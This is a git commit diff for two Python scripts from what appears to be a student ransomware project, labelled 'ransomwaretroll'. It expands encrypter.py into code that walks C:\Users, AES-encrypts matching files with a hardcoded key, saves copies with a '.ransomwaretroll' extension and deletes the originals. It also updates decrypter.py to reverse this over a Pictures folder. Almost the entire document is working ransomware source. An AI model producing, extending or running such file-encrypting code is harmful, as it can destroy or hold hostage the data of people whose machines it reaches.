67272b5cd143690a15d389babe450b5ef6cda2ca
Victori <123122725+VictorriDB@users.noreply.github.com>
2023-10-04 21:27:36 -0300

    Adição da Encriptação de Arquivos

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,37 @@
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Define the root directory where the encrypted files are located
+root_directory = r"C:\Users\alanv\Pictures"
 
-## chave para descriptografia
+# Define the decryption key (must be the same as used for encryption)
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
-os.remove(file_name)
+# Function to decrypt a file
+def decrypt_file(encrypted_file_path, key):
+    with open(encrypted_file_path, "rb") as encrypted_file:
+        encrypted_data = encrypted_file.read()
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
+    # Decrypt the file data using AES
+    aes = pyaes.AESModeOfOperationCTR(key)
+    decrypted_data = aes.decrypt(encrypted_data)
+
+    # Remove the ".ransomwaretroll" extension to get the original file name
+    original_file_path = encrypted_file_path[:-len(".ransomwaretroll")]
+
+    # Write the decrypted data to the original file
+    with open(original_file_path, 'wb') as original_file:
+        original_file.write(decrypted_data)
+
+    # Remove the encrypted file
+    os.remove(encrypted_file_path)
+
+# Walk through the root directory and decrypt ".ransomwaretroll" files
+for root, dirs, files in os.walk(root_directory):
+    for file in files:
+        if file.endswith('.ransomwaretroll'):
+            encrypted_file_path = os.path.join(root, file)
+            decrypt_file(encrypted_file_path, key)
+
+
+
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,33 @@
 import os
 import pyaes
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Define the root directory for your image files
+root_directory = r"C:\Users"
 
-## remover o arquivo
-os.remove(file_name)
-
-## chave de criptografia
+# Define the encryption key
 key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+# Function to encrypt a file
+def encrypt_file(file_path, key):
+    with open(file_path, "rb") as file:
+        file_data = file.read()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    # Encrypt the file data using AES
+    aes = pyaes.AESModeOfOperationCTR(key)
+    crypto_data = aes.encrypt(file_data)
+
+    # Create a new file with the ".ransomwaretroll" extension and write the encrypted data
+    new_file_path = file_path + ".ransomwaretroll"
+    with open(new_file_path, 'wb') as new_file:
+        new_file.write(crypto_data)
+
+    # Remove the original unencrypted file
+    os.remove(file_path)
+
+# Walk through the root directory and encrypt ddl files
+for root, dirs, files in os.walk(root_directory):
+    for file in files:
+        if file.endswith('.ddl'):
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path, key)
+
